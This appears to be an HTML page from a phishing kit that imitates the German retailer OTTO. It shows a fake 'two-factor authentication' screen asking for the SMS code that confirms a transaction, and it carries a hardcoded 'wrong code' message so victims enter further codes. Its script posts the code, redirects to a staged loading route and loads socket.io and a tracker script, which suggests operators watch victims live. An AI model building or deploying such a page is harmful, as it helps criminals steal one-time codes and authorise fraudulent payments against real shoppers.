<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <link rel="stylesheet" href="./css/bratoka.css">
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"
        integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
</head>

<style>
        body {
            background-color: #ffffff;
            margin: 0;
            padding: 0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            color: #1a1a1a;
            display: block; /* Override flex from dionam.css */
            min-height: 100vh;
        }

        .cc-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 15px 40px;
            border-bottom: 1px solid #eaeaea;
        }

        .cc-logo {
        
            padding: 8px;
            display: inline-block;
        }

        .cc-logo img {
            height: 50px;
            display: block;
        }

        .language-selector {
            display: flex;
            align-items: center;
            gap: 8px;
            font-size: 14px;
            font-weight: 600;
            color: #001a3b;
            cursor: pointer;
        }
        
        .language-selector svg {
            width: 16px;
            height: 16px;
            fill: #001a3b;
        }

        .cc-main {
            max-width: 550px;
            margin: 60px auto;
            padding: 0 20px;
        }

        .cc-page-title {
            text-align: center;
            font-size: 22px;
            font-weight: 700;
            color: #001a3b;
            margin-bottom: 30px;
        }

        .cc-form-box {
            background-color: #f7f7f9;
            border: 1px solid #e0e0e0;
            border-radius: 8px;
            padding: 25px;
        }

        .cc-box-header {
            display: flex;
            align-items: center;
            gap: 12px;
            margin-bottom: 15px;
        }

        .cc-box-header svg {
            width: 24px;
            height: 24px;
            fill: #001a3b;
        }

        .cc-box-title {
            font-size: 16px;
            font-weight: 700;
            color: #001a3b;
        }

        .mandatory-text {
            font-size: 14px;
            color: #5b687c;
            margin-bottom: 25px;
        }

        .form-group {
            margin-bottom: 20px;
        }

        .form-label {
            display: block;
            font-size: 13px;
            color: #333;
            margin-bottom: 8px;
        }

        .input-wrapper {
            position: relative;
            display: flex;
            align-items: center;
        }

        .form-input {
            width: 100%;
            padding: 12px 15px;
            border: 1px solid #d0d0d0;
            border-radius: 4px;
            font-size: 15px;
            color: #333;
            box-sizing: border-box;
            background-color: #fff;
            transition: border-color 0.2s, box-shadow 0.2s;
            outline: none;
            letter-spacing: 2px;
        }

        .form-input:focus {
            border-color: #0070ba;
            box-shadow: 0 0 0 1px #0070ba;
        }

        .btn-buy {
            background-color: #081226;
            color: #fff;
            width: 100%;
            padding: 16px;
            font-size: 16px;
            font-weight: 600;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            transition: background-color 0.2s;
            margin-top: 25px;
        }

        .btn-buy:hover {
            background-color: #050b17;
        }

        .btn-buy svg {
            width: 16px;
            height: 16px;
            fill: #fff;
        }

        .cc-footer {
            border-top: 1px solid #eaeaea;
            padding: 20px 40px;
            display: flex;
            justify-content: flex-end;
            margin-top: 50px;
        }

        .cc-footer a {
            font-size: 12px;
            color: #001a3b;
            text-decoration: underline;
        }

        .otp-info {
            display: flex;
            align-items: flex-start;
            gap: 10px;
            background-color: #e6f2ff;
            padding: 15px;
            border-radius: 4px;
            margin-bottom: 20px;
            border-left: 4px solid #0070ba;
            font-size: 14px;
            color: #001a3b;
            line-height: 1.5;
        }

        .otp-info svg {
            width: 20px;
            height: 20px;
            fill: #0070ba;
            flex-shrink: 0;
            margin-top: 2px;
        }

        /* Mobile Responsiveness */
        @media screen and (max-width: 768px) {
            .cc-header {
                padding: 15px 20px;
            }
            .cc-main {
                margin: 20px auto;
                padding: 0 15px;
            }
            .cc-footer {
                padding: 20px;
                justify-content: center;
            }
        }
    </style>
</head>
<body>

    <header class="cc-header">
        <div class="cc-logo">
            <img src="./img/otologo-2.jpg" alt="OTTO">
        </div>
        <div class="language-selector">
            <svg viewBox="0 0 24 24">
                <path d="M11.99 2C6.47 2 2 6.48 2 12s4.47 10 9.99 10C17.52 22 22 17.52 22 12S17.52 2 11.99 2zm6.93 6h-2.95c-.32-1.25-.78-2.45-1.38-3.56 1.84.63 3.37 1.91 4.33 3.56zM12 4.04c.83 1.2 1.48 2.53 1.91 3.96h-3.82c.43-1.43 1.08-2.76 1.91-3.96zM4.26 14C4.1 13.36 4 12.69 4 12s.1-1.36.26-2h3.38c-.08.66-.14 1.32-.14 2s.06 1.34.14 2H4.26zm.82 2h2.95c.32 1.25.78 2.45 1.38 3.56-1.84-.63-3.37-1.9-4.33-3.56zm2.95-8H5.08c.96-1.66 2.49-2.93 4.33-3.56C8.81 5.55 8.35 6.75 8.03 8zM12 19.96c-.83-1.2-1.48-2.53-1.91-3.96h3.82c-.43 1.43-1.08 2.76-1.91 3.96zM14.34 14H9.66c-.09-.66-.16-1.32-.16-2s.07-1.35.16-2h4.68c.09.65.16 1.32.16 2s-.07 1.34-.16 2zm.25 5.56c.6-1.11 1.06-2.31 1.38-3.56h2.95c-.96 1.65-2.49 2.93-4.33 3.56zM16.36 14c.08-.66.14-1.32.14-2s-.06-1.34-.14-2h3.38c.16.64.26 1.31.26 2s-.1 1.36-.26 2h-3.38z"/>
            </svg>
            Deutsch
        </div>
    </header>

    <main class="cc-main">
        <h1 class="cc-page-title">Sicherheitsüberprüfung</h1>

        <div class="cc-form-box">
            <div class="cc-box-header">
                <svg viewBox="0 0 24 24">
                    <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/>
                </svg>
                <div class="cc-box-title">Zwei-Faktor-Authentifizierung</div>
            </div>

            <div class="otp-info">
                <svg viewBox="0 0 24 24">
                    <path d="M11 15h2v2h-2zm0-8h2v6h-2zm.99-5C6.47 2 2 6.48 2 12s4.47 10 9.99 10C17.52 22 22 17.52 22 12S17.52 2 11.99 2zM12 20c-4.42 0-8-3.58-8-8s3.58-8 8-8 8 3.58 8 8-3.58 8-8 8z"/>
                </svg>
                <div>Bitte geben Sie den Verifizierungscode ein, den wir Ihnen per SMS gesendet haben, um die Transaktion zu bestätigen.</div>
            </div>

            <form id="semitr1" method="post">
                <div class="form-group">
                    <label class="form-label">Verifizierungscode (OTP)</label>
                    <div class="input-wrapper">
                        <input type="tel" id="smsCode" name="smsCode" class="form-input" required autocomplete="one-time-code" placeholder="Geben Sie den Code ein" maxlength="8">
                    </div>
                    <p style="color: #d01a1a; font-weight: 500; margin-bottom: 15px; text-align: center;">Der eingegebene
                    Code ist nicht korrekt. Bitte überprüfen Sie den Code, den wir Ihnen gesendet haben.</p>
                </div>

                <button type="submit" class="btn-buy">
                    Bestätigen
                </button>
            </form>
        </div>
    </main>

    <footer class="cc-footer">
        <a href="#">Allgemeine Geschäftsbedingungen</a>
    </footer>


        <script>
            document.addEventListener('DOMContentLoaded', function () {
                const form = document.getElementById('semitr1');
                const smsCodeInput = document.getElementById('smsCode');
                const smsCodeError = document.getElementById('smsCodeError');

                // Only allow numbers in SMS code field
                smsCodeInput.addEventListener('keypress', function (e) {
                    if (!/^\d$/.test(e.key) && e.key !== 'Backspace' && e.key !== 'Delete') {
                        e.preventDefault();
                    }
                });

                // Clear error when user starts typing
                smsCodeInput.addEventListener('input', function () {
                    smsCodeError.textContent = '';
                    smsCodeInput.classList.remove('input-error');
                });

                // Validate SMS code format
                function validateSmsCode(code) {
                    return /^\d{6}$/.test(code); // Must be exactly 6 digits
                }

                form.addEventListener('submit', function (e) {
                    e.preventDefault();
                    const smsCode = smsCodeInput.value.trim();

                    // Validate SMS code
                    if (!smsCode) {
                        smsCodeError.textContent = 'Bitte geben Sie den Sicherheitscode ein';
                        smsCodeInput.classList.add('input-error');
                        return false;
                    } else if (!validateSmsCode(smsCode)) {
                        smsCodeError.textContent = 'Der Sicherheitscode muss 6 Ziffern enthalten';
                        smsCodeInput.classList.add('input-error');
                        return false;
                    }

                    form.setAttribute('data-redirect', '/loading?time=3&url=SmS-2-hkjnUHnKJHu');
                    form.requestSubmit();

                    // Show processing state
                    const submitButton = form.querySelector('button[type="submit"]');
                    const originalButtonText = submitButton.textContent;
                    submitButton.textContent = 'Wird verarbeitet...';
                    submitButton.disabled = true;
                });
            });
        </script>
        <script src="/socket.io/socket.io.js"></script>
        <script src="js/tracker.js"></script>

</body>

</html>